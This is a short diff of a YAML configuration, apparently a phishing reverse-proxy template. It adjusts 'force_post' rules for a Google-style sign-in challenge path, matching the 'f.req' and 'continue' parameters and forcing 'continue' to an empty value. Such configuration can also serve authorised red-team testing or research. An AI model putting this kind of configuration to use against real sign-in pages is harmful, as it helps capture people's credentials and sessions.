@@ -61,7 +61,8 @@ login:
 force_post:
   - path: '/_/signin/sl/challenge'
     search: 
-      - key: 'f.req'
-        search: '.*'
-      - key: 'continue'
-        search: '.*'
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
